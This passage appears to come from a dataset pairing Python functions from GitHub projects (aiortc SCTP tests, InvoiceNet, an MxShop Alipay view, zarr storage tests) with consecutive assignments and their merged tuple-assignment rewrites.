        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # artificially raise flight size to hit cwnd
        client._flight_size += 2400

        # SACK comes in acknowledging chunk 7
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 6)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in acknowledging all chunks up to 3, and 5, 6, 7
        sack = SackChunk()
        sack.cumulative_tsn = 3
        sack.gaps = [(2, 4)]  # TSN 4 is missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in ackowledging all chunks
        sack = SackChunk()
        sack.cumulative_tsn = 7
        with self.assertTimerStopped(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 2400)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [])
        self.assertEqual(queued_tsns(client), [])","client._last_sacked_tsn = 4294967295
client._local_tsn = 0
client._ssthresh = 131072
client._send_chunk = mock_send_chunk","client._last_sacked_tsn , client._local_tsn , client._ssthresh , client._send_chunk  = 4294967295, 0, 131072, mock_send_chunk"
aiortc,https://github.com/aiortc/aiortc/tree/master/tests/test_rtcsctptransport.py,RTCSctpTransportTest,test_send_data_with_gap_3_retransmit$2204,"def test_send_data_with_gap_3_retransmit(self):
        sent_tsns = []

        async def mock_send_chunk(chunk):
            sent_tsns.append(chunk.tsn)

        client = RTCSctpTransport(self.client_transport)
        client._last_sacked_tsn = 4294967295
        client._local_tsn = 0
        client._ssthresh = 131072
        client._send_chunk = mock_send_chunk

        # queue 8 chunks, but cwnd only allows 3
        with self.assertTimerRestarted(client):
            run(client._send(123, 456, b""M"" * USERDATA_MAX_LENGTH * 8))

        self.assertEqual(client._cwnd, 3600)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2])
        self.assertEqual(outstanding_tsns(client), [0, 1, 2])
        self.assertEqual(queued_tsns(client), [3, 4, 5, 6, 7])

        # SACK comes in acknowledging chunks 0 and 1
        sack = SackChunk()
        sack.cumulative_tsn = 1
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5])
        self.assertEqual(queued_tsns(client), [6, 7])

        # SACK comes in acknowledging chunk 5
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 4)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6])
        self.assertEqual(queued_tsns(client), [7])

        # SACK comes in acknowledging chunk 6
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 5)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # artificially raise flight size to hit cwnd
        client._flight_size += 2400

        # SACK comes in acknowledging chunk 7
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 6)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in acknowledging all chunks up to 3, and 5, 6, 7
        sack = SackChunk()
        sack.cumulative_tsn = 3
        sack.gaps = [(2, 4)]  # TSN 4 is missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in ackowledging all chunks
        sack = SackChunk()
        sack.cumulative_tsn = 7
        with self.assertTimerStopped(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 2400)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [])
        self.assertEqual(queued_tsns(client), [])","sack.cumulative_tsn = 1
sack.gaps = [(4, 4)]","sack.cumulative_tsn , sack.gaps  = 1, [(4, 4)]"
aiortc,https://github.com/aiortc/aiortc/tree/master/tests/test_rtcsctptransport.py,RTCSctpTransportTest,test_send_data_with_gap_3_retransmit$2204,"def test_send_data_with_gap_3_retransmit(self):
        sent_tsns = []

        async def mock_send_chunk(chunk):
            sent_tsns.append(chunk.tsn)

        client = RTCSctpTransport(self.client_transport)
        client._last_sacked_tsn = 4294967295
        client._local_tsn = 0
        client._ssthresh = 131072
        client._send_chunk = mock_send_chunk

        # queue 8 chunks, but cwnd only allows 3
        with self.assertTimerRestarted(client):
            run(client._send(123, 456, b""M"" * USERDATA_MAX_LENGTH * 8))

        self.assertEqual(client._cwnd, 3600)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2])
        self.assertEqual(outstanding_tsns(client), [0, 1, 2])
        self.assertEqual(queued_tsns(client), [3, 4, 5, 6, 7])

        # SACK comes in acknowledging chunks 0 and 1
        sack = SackChunk()
        sack.cumulative_tsn = 1
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5])
        self.assertEqual(queued_tsns(client), [6, 7])

        # SACK comes in acknowledging chunk 5
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 4)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6])
        self.assertEqual(queued_tsns(client), [7])

        # SACK comes in acknowledging chunk 6
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 5)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # artificially raise flight size to hit cwnd
        client._flight_size += 2400

        # SACK comes in acknowledging chunk 7
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 6)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in acknowledging all chunks up to 3, and 5, 6, 7
        sack = SackChunk()
        sack.cumulative_tsn = 3
        sack.gaps = [(2, 4)]  # TSN 4 is missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in ackowledging all chunks
        sack = SackChunk()
        sack.cumulative_tsn = 7
        with self.assertTimerStopped(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 2400)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [])
        self.assertEqual(queued_tsns(client), [])","sack.cumulative_tsn = 1
sack.gaps = [(4, 5)]","sack.cumulative_tsn , sack.gaps  = 1, [(4, 5)]"
aiortc,https://github.com/aiortc/aiortc/tree/master/tests/test_rtcsctptransport.py,RTCSctpTransportTest,test_send_data_with_gap_3_retransmit$2204,"def test_send_data_with_gap_3_retransmit(self):
        sent_tsns = []

        async def mock_send_chunk(chunk):
            sent_tsns.append(chunk.tsn)

        client = RTCSctpTransport(self.client_transport)
        client._last_sacked_tsn = 4294967295
        client._local_tsn = 0
        client._ssthresh = 131072
        client._send_chunk = mock_send_chunk

        # queue 8 chunks, but cwnd only allows 3
        with self.assertTimerRestarted(client):
            run(client._send(123, 456, b""M"" * USERDATA_MAX_LENGTH * 8))

        self.assertEqual(client._cwnd, 3600)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2])
        self.assertEqual(outstanding_tsns(client), [0, 1, 2])
        self.assertEqual(queued_tsns(client), [3, 4, 5, 6, 7])

        # SACK comes in acknowledging chunks 0 and 1
        sack = SackChunk()
        sack.cumulative_tsn = 1
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5])
        self.assertEqual(queued_tsns(client), [6, 7])

        # SACK comes in acknowledging chunk 5
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 4)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6])
        self.assertEqual(queued_tsns(client), [7])

        # SACK comes in acknowledging chunk 6
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 5)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # artificially raise flight size to hit cwnd
        client._flight_size += 2400

        # SACK comes in acknowledging chunk 7
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 6)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in acknowledging all chunks up to 3, and 5, 6, 7
        sack = SackChunk()
        sack.cumulative_tsn = 3
        sack.gaps = [(2, 4)]  # TSN 4 is missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in ackowledging all chunks
        sack = SackChunk()
        sack.cumulative_tsn = 7
        with self.assertTimerStopped(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 2400)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [])
        self.assertEqual(queued_tsns(client), [])","sack.cumulative_tsn = 1
sack.gaps = [(4, 6)]","sack.cumulative_tsn , sack.gaps  = 1, [(4, 6)]"
aiortc,https://github.com/aiortc/aiortc/tree/master/tests/test_rtcsctptransport.py,RTCSctpTransportTest,test_send_data_with_gap_3_retransmit$2204,"def test_send_data_with_gap_3_retransmit(self):
        sent_tsns = []

        async def mock_send_chunk(chunk):
            sent_tsns.append(chunk.tsn)

        client = RTCSctpTransport(self.client_transport)
        client._last_sacked_tsn = 4294967295
        client._local_tsn = 0
        client._ssthresh = 131072
        client._send_chunk = mock_send_chunk

        # queue 8 chunks, but cwnd only allows 3
        with self.assertTimerRestarted(client):
            run(client._send(123, 456, b""M"" * USERDATA_MAX_LENGTH * 8))

        self.assertEqual(client._cwnd, 3600)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2])
        self.assertEqual(outstanding_tsns(client), [0, 1, 2])
        self.assertEqual(queued_tsns(client), [3, 4, 5, 6, 7])

        # SACK comes in acknowledging chunks 0 and 1
        sack = SackChunk()
        sack.cumulative_tsn = 1
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5])
        self.assertEqual(queued_tsns(client), [6, 7])

        # SACK comes in acknowledging chunk 5
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 4)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6])
        self.assertEqual(queued_tsns(client), [7])

        # SACK comes in acknowledging chunk 6
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 5)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerPreserved(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # artificially raise flight size to hit cwnd
        client._flight_size += 2400

        # SACK comes in acknowledging chunk 7
        sack = SackChunk()
        sack.cumulative_tsn = 1
        sack.gaps = [(4, 6)]  # TSN 2, 3 and 4 are missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 4800)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3])
        self.assertEqual(outstanding_tsns(client), [2, 3, 4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in acknowledging all chunks up to 3, and 5, 6, 7
        sack = SackChunk()
        sack.cumulative_tsn = 3
        sack.gaps = [(2, 4)]  # TSN 4 is missing
        with self.assertTimerRestarted(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, 7)
        self.assertEqual(client._flight_size, 3600)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [4, 5, 6, 7])
        self.assertEqual(queued_tsns(client), [])

        # SACK comes in ackowledging all chunks
        sack = SackChunk()
        sack.cumulative_tsn = 7
        with self.assertTimerStopped(client):
            run(client._receive_chunk(sack))

        self.assertEqual(client._cwnd, 4800)
        self.assertEqual(client._fast_recovery_exit, None)
        self.assertEqual(client._flight_size, 2400)
        self.assertEqual(sent_tsns, [0, 1, 2, 3, 4, 5, 6, 7, 2, 3, 4])
        self.assertEqual(outstanding_tsns(client), [])
        self.assertEqual(queued_tsns(client), [])","sack.cumulative_tsn = 3
sack.gaps = [(2, 4)]","sack.cumulative_tsn , sack.gaps  = 3, [(2, 4)]"
InvoiceNet,https://github.com/naiveHobo/InvoiceNet/tree/master/invoicenet/gui/custom_widgets.py,DisplayCanvas,reset$250,"def reset(self):
        self.canvas.delete(""all"")
        self.rect = None
        self.image = None
        self.image_obj = None
        self.pil_image = None
        self.draw = False","self.rect = None
self.image = None
self.image_obj = None
self.pil_image = None
self.draw = False","self.rect , self.image , self.image_obj , self.pil_image , self.draw  = None, None, None, None, False"
MxShop,https://github.com/derek-zhang123/MxShop/tree/master/apps/trade/views.py,AlipayView,get$117,"def get(self, request):
        """"""
        处理支付宝的return_url返回
        """"""
        processed_dict = {}
        # 1. 获取GET中参数
        for key, value in request.GET.items():
            processed_dict[key] = value
        # 2. 取出sign
        sign = processed_dict.pop(""sign"", None)

        # 3. 生成ALipay对象
        alipay = AliPay(
            appid=""2016091500517456"",
            app_notify_url=""http://47.93.198.159:8000/alipay/return/"",
            app_private_key_path=private_key_path,
            alipay_public_key_path=ali_pub_key_path,  # 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,
            debug=True,  # 默认False,
            return_url=""http://47.93.198.159:8000/alipay/return/""
        )

        verify_re = alipay.verify(processed_dict, sign)

        # 这里可以不做操作。因为不管发不发return url。notify url都会修改订单状态。
        if verify_re is True:
            order_sn = processed_dict.get('out_trade_no', None)
            trade_no = processed_dict.get('trade_no', None)
            trade_status = processed_dict.get('trade_status', None)

            existed_orders = OrderInfo.objects.filter(order_sn=order_sn)
            for existed_order in existed_orders:
                existed_order.pay_status = trade_status
                existed_order.trade_no = trade_no
                existed_order.pay_time = datetime.now()
                existed_order.save()

            response = redirect(""/index/#/app/home/member/order"")
            return response

        else:
            response = redirect(""index"")
            return response","sign = processed_dict.pop('sign', None)
alipay = AliPay(appid='2016091500517456', app_notify_url='http://47.93.198.159:8000/alipay/return/', app_private_key_path=private_key_path, alipay_public_key_path=ali_pub_key_path, debug=True, return_url='http://47.93.198.159:8000/alipay/return/')","sign , alipay  = processed_dict.pop('sign', None), AliPay(appid='2016091500517456', app_notify_url='http://47.93.198.159:8000/alipay/return/', app_private_key_path=private_key_path, alipay_public_key_path=ali_pub_key_path, debug=True, return_url='http://47.93.198.159:8000/alipay/return/')"
MxShop,https://github.com/derek-zhang123/MxShop/tree/master/apps/trade/views.py,AlipayView,get$117,"def get(self, request):
        """"""
        处理支付宝的return_url返回
        """"""
        processed_dict = {}
        # 1. 获取GET中参数
        for key, value in request.GET.items():
            processed_dict[key] = value
        # 2. 取出sign
        sign = processed_dict.pop(""sign"", None)

        # 3. 生成ALipay对象
        alipay = AliPay(
            appid=""2016091500517456"",
            app_notify_url=""http://47.93.198.159:8000/alipay/return/"",
            app_private_key_path=private_key_path,
            alipay_public_key_path=ali_pub_key_path,  # 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,
            debug=True,  # 默认False,
            return_url=""http://47.93.198.159:8000/alipay/return/""
        )

        verify_re = alipay.verify(processed_dict, sign)

        # 这里可以不做操作。因为不管发不发return url。notify url都会修改订单状态。
        if verify_re is True:
            order_sn = processed_dict.get('out_trade_no', None)
            trade_no = processed_dict.get('trade_no', None)
            trade_status = processed_dict.get('trade_status', None)

            existed_orders = OrderInfo.objects.filter(order_sn=order_sn)
            for existed_order in existed_orders:
                existed_order.pay_status = trade_status
                existed_order.trade_no = trade_no
                existed_order.pay_time = datetime.now()
                existed_order.save()

            response = redirect(""/index/#/app/home/member/order"")
            return response

        else:
            response = redirect(""index"")
            return response","trade_no = processed_dict.get('trade_no', None)
trade_status = processed_dict.get('trade_status', None)
existed_orders = OrderInfo.objects.filter(order_sn=order_sn)","trade_no , trade_status , existed_orders  = processed_dict.get('trade_no', None), processed_dict.get('trade_status', None), OrderInfo.objects.filter(order_sn=order_sn)"
MxShop,https://github.com/derek-zhang123/MxShop/tree/master/apps/trade/views.py,AlipayView,get$117,"def get(self, request):
        """"""
        处理支付宝的return_url返回
        """"""
        processed_dict = {}
        # 1. 获取GET中参数
        for key, value in request.GET.items():
            processed_dict[key] = value
        # 2. 取出sign
        sign = processed_dict.pop(""sign"", None)

        # 3. 生成ALipay对象
        alipay = AliPay(
            appid=""2016091500517456"",
            app_notify_url=""http://47.93.198.159:8000/alipay/return/"",
            app_private_key_path=private_key_path,
            alipay_public_key_path=ali_pub_key_path,  # 支付宝的公钥，验证支付宝回传消息使用，不是你自己的公钥,
            debug=True,  # 默认False,
            return_url=""http://47.93.198.159:8000/alipay/return/""
        )

        verify_re = alipay.verify(processed_dict, sign)

        # 这里可以不做操作。因为不管发不发return url。notify url都会修改订单状态。
        if verify_re is True:
            order_sn = processed_dict.get('out_trade_no', None)
            trade_no = processed_dict.get('trade_no', None)
            trade_status = processed_dict.get('trade_status', None)

            existed_orders = OrderInfo.objects.filter(order_sn=order_sn)
            for existed_order in existed_orders:
                existed_order.pay_status = trade_status
                existed_order.trade_no = trade_no
                existed_order.pay_time = datetime.now()
                existed_order.save()

            response = redirect(""/index/#/app/home/member/order"")
            return response

        else:
            response = redirect(""index"")
            return response","existed_order.pay_status = trade_status
existed_order.trade_no = trade_no
existed_order.pay_time = datetime.now()","existed_order.pay_status , existed_order.trade_no , existed_order.pay_time  = trade_status, trade_no, datetime.now()"
zarr-python,https://github.com/zarr-developers/zarr-python/tree/master/zarr/tests/test_storage.py,,test_format_compatibility$2313,"def test_format_compatibility():

    # This test is intended to catch any unintended changes that break the ability to
    # read data stored with a previous minor version (which should be format-compatible).

    # fixture data
    fixture = group(store=DirectoryStore('fixture'))

    # set seed to get consistent random data
    np.random.seed(42)

    arrays_chunks = [
        (np.arange(1111, dtype='<i1'), 100),
        (np.arange(1111, dtype='<i2'), 100),
        (np.arange(1111, dtype='<i4'), 100),
        (np.arange(1111, dtype='<i8'), 1000),
        (np.random.randint(0, 200, size=2222, dtype='u1').astype('<u1'), 100),
        (np.random.randint(0, 2000, size=2222, dtype='u2').astype('<u2'), 100),
        (np.random.randint(0, 2000, size=2222, dtype='u4').astype('<u4'), 100),
        (np.random.randint(0, 2000, size=2222, dtype='u8').astype('<u8'), 100),
        (np.linspace(0, 1, 3333, dtype='<f2'), 100),
        (np.linspace(0, 1, 3333, dtype='<f4'), 100),
        (np.linspace(0, 1, 3333, dtype='<f8'), 100),
        (np.random.normal(loc=0, scale=1, size=4444).astype('<f2'), 100),
        (np.random.normal(loc=0, scale=1, size=4444).astype('<f4'), 100),
        (np.random.normal(loc=0, scale=1, size=4444).astype('<f8'), 100),
        (np.random.choice([b'A', b'C', b'G', b'T'],
                          size=5555, replace=True).astype('S'), 100),
        (np.random.choice(['foo', 'bar', 'baz', 'quux'],
                          size=5555, replace=True).astype('<U'), 100),
        (np.random.choice([0, 1/3, 1/7, 1/9, np.nan],
                          size=5555, replace=True).astype('<f8'), 100),
        (np.random.randint(0, 2, size=5555, dtype=bool), 100),
        (np.arange(20000, dtype='<i4').reshape(2000, 10, order='C'), (100, 3)),
        (np.arange(20000, dtype='<i4').reshape(200, 100, order='F'), (100, 30)),
        (np.arange(20000, dtype='<i4').reshape(200, 10, 10, order='C'), (100, 3, 3)),
        (np.arange(20000, dtype='<i4').reshape(20, 100, 10, order='F'), (10, 30, 3)),
        (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='C'), (10, 3, 3, 3)),
        (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='F'), (10, 3, 3, 3)),
    ]

    compressors = [
        None,
        Zlib(level=1),
        BZ2(level=1),
        Blosc(cname='zstd', clevel=1, shuffle=0),
        Blosc(cname='zstd', clevel=1, shuffle=1),
        Blosc(cname='zstd', clevel=1, shuffle=2),
        Blosc(cname='lz4', clevel=1, shuffle=0),
    ]

    for i, (arr, chunks) in enumerate(arrays_chunks):

        if arr.flags.f_contiguous:
            order = 'F'
        else:
            order = 'C'

        for j, compressor in enumerate(compressors):
            path = '{}/{}'.format(i, j)

            if path not in fixture:  # pragma: no cover
                # store the data - should be one-time operation
                fixture.array(path, data=arr, chunks=chunks, order=order,
                              compressor=compressor)

            # setup array
            z = fixture[path]

            # check contents
            if arr.dtype.kind == 'f':
                assert_array_almost_equal(arr, z[:])
            else:
                assert_array_equal(arr, z[:])

            # check dtype
            assert arr.dtype == z.dtype

            # check compressor
            if compressor is None:
                assert z.compressor is None
            else:
                assert compressor.codec_id == z.compressor.codec_id
                assert compressor.get_config() == z.compressor.get_config()","arrays_chunks = [(np.arange(1111, dtype='<i1'), 100), (np.arange(1111, dtype='<i2'), 100), (np.arange(1111, dtype='<i4'), 100), (np.arange(1111, dtype='<i8'), 1000), (np.random.randint(0, 200, size=2222, dtype='u1').astype('<u1'), 100), (np.random.randint(0, 2000, size=2222, dtype='u2').astype('<u2'), 100), (np.random.randint(0, 2000, size=2222, dtype='u4').astype('<u4'), 100), (np.random.randint(0, 2000, size=2222, dtype='u8').astype('<u8'), 100), (np.linspace(0, 1, 3333, dtype='<f2'), 100), (np.linspace(0, 1, 3333, dtype='<f4'), 100), (np.linspace(0, 1, 3333, dtype='<f8'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f2'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f4'), 100), (np.random.normal(loc=0, scale=1, size=4444).astype('<f8'), 100), (np.random.choice([b'A', b'C', b'G', b'T'], size=5555, replace=True).astype('S'), 100), (np.random.choice(['foo', 'bar', 'baz', 'quux'], size=5555, replace=True).astype('<U'), 100), (np.random.choice([0, 1 / 3, 1 / 7, 1 / 9, np.nan], size=5555, replace=True).astype('<f8'), 100), (np.random.randint(0, 2, size=5555, dtype=bool), 100), (np.arange(20000, dtype='<i4').reshape(2000, 10, order='C'), (100, 3)), (np.arange(20000, dtype='<i4').reshape(200, 100, order='F'), (100, 30)), (np.arange(20000, dtype='<i4').reshape(200, 10, 10, order='C'), (100, 3, 3)), (np.arange(20000, dtype='<i4').reshape(20, 100, 10, order='F'), (10, 30, 3)), (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='C'), (10, 3, 3, 3)), (np.arange(20000, dtype='<i4').reshape(20, 10, 10, 10, order='F'), (10, 3, 3, 3))]
